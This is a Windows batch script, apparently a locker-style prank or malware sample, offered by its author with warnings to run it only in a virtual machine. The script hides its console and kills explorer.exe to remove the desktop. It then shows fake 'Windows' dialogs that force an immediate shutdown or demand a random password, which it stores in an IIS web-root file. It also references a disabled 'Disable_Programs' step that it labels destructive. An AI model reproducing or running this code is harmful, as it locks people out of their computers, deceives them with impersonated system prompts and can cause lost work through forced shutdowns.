@echo off
rem ----------------------------------------------------------------------
rem | This program can prohibit you from using your computer.            |
rem | !!!WARNING!!!: Please DO NOT run this program on your computer!!!  |
rem | !!!WARNING!!!: It is DESTRUCTIVE!!!                                |
rem | !!!WARNING!!!: Please run this program on the VIRTUAL MACHINE!!!   |
rem | By @xiarimangguo // My Github: https://github.com/xiarimangguo/    |
rem | If  you like this, don't forget to give me a star on Github!!!     |
rem ----------------------------------------------------------------------
rem Hide cmd window
if "%1"=="hide" goto CmdBegin
start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit
:CmdBegin
rem Set output encoding
chcp 437
rem Kill "explorer.exe", and Make the desktop disappear
taskkill /f /im explorer.exe /t
rem Enable variable delay
setlocal enabledelayedexpansion
rem Pop-up warning window
set Vbscript=Msgbox("About to log out of your login!",1+48+4096,"Windows")
rem Play warning tone
powershell -c (New-Object Media.SoundPlayer "D:\wrn.wav").PlaySync();
rem Get the return value
for /f "Delims=" %%a in ('MsHta VBScript:Execute("CreateObject(""Scripting.Filesystemobject"").GetStandardStream(1).Write(%Vbscript:"=""%)"^)(Close^)') do Set MsHtaReturnValue=%%a
rem Print the return value
echo Return %MsHtaReturnValue%!
if %MsHtaReturnValue% == 1 (
    rem If click OK, then Shutdown the computer
    shutdown.exe -s -t 0
) else if %MsHtaReturnValue% == 2 (
    rem If click Cancel, then execute the following command
    rem Generate random password
    call:Random
    rem Print the password
    echo Output !Pass!
    rem Pop-up password inputbox
    set Vbscript2=Inputbox("Please enter password!","Windows")
    rem Play warning tone
    powershell -c (New-Object Media.SoundPlayer "D:\wrn.wav").PlaySync();
    rem Get the return value
    for /f "Delims=" %%b in ('MsHta VBScript:Execute("CreateObject(""Scripting.Filesystemobject"").GetStandardStream(1).Write(%Vbscript2:"=""%))"^)(Close^)') do Set MsHtaReturnValue2=%%b
    rem Print the return value
    echo Return %MsHtaReturnValue2%!
      if "%MsHtaReturnValue2%" == "" (
        rem If the entered password is empty, then goto Fail
        goto Fail
    ) else if "%MsHtaReturnValue2%" == "!Pass!" (
        rem If the entered password is correct, then goto Success
        goto Success
    ) else (
        rem If the entered password is wrong, then goto Fail
        goto Fail
    )
) else (
)

:Success
        rem Pop-up Success window
        set Vbscript3=Msgbox("Success!",0+48+4096,"Windows")
        rem Play warning tone
        powershell -c (New-Object Media.SoundPlayer "D:\wrn.wav").PlaySync();
        rem Get the return value
        for /f "Delims=" %%c in ('MsHta VBScript:Execute("CreateObject(""Scripting.Filesystemobject"").GetStandardStream(1).Write(%Vbscript3:"=""%)"^)(Close^)') do Set MsHtaReturnValue3=%%c
        rem Print the return value
        echo Return %MsHtaReturnValue3%!
        goto Close
        exit
:Fail
        rem Pop-up Fail window
        set Vbscript3=Msgbox("Fail!",0+48+4096,"Windows")
        rem Play error tone
        powershell -c (New-Object Media.SoundPlayer "D:\err.wav").PlaySync();
        rem Get the return value
        for /f "Delims=" %%c in ('MsHta VBScript:Execute("CreateObject(""Scripting.Filesystemobject"").GetStandardStream(1).Write(%Vbscript3:"=""%)"^)(Close^)') do Set MsHtaReturnValue3=%%c
        rem Print the return value
        echo Return %MsHtaReturnValue3%!
        goto Shutdown
        exit
:Random
rem Generate random password
rem Generate the first random number
set num=%random%
rem Generate a four-digit random rumber
set /a num=num%%9000+1000
rem Generate the second random number
set num2=%random%
rem Generate a four-digit random rumber
set /a num2=num2%%9000+1000
rem Bined into an eight-digit number as the password
set Pass=%num%%num2%
rem Export the password to file
rem !!!NOTICE!!!: You must visit "pass.txt" in the root directory of your IIS Website to get the Password
echo ----------------Your PASS ----------------^ > C:\inetpub\wwwroot\pass.txt
echo [Enter the pass below to use your computer]^ >> C:\inetpub\wwwroot\pass.txt
echo                {%num%%num2%} >> C:\inetpub\wwwroot\pass.txt
goto:eof
:Close
if %MsHtaReturnValue3% == 1 (
    rem If the click OK, then Resume "explorer.exe", and Make the desktop appear
    start explorer.exe
    rem !!!NOTICE!!!: You can delete this if you do not need this function. (It is DESTRUCTIVE!!!)
    rem (It is currently not enabled.)
    rem start Disable_Programs.bat
) else (
    pause
)
goto:eof
:Shutdown
if %MsHtaReturnValue3% == 1 (
    rem If the click OK, then Shutdown the computer
    shutdown.exe -s -t 0
) else (
    pause
)
goto:eof
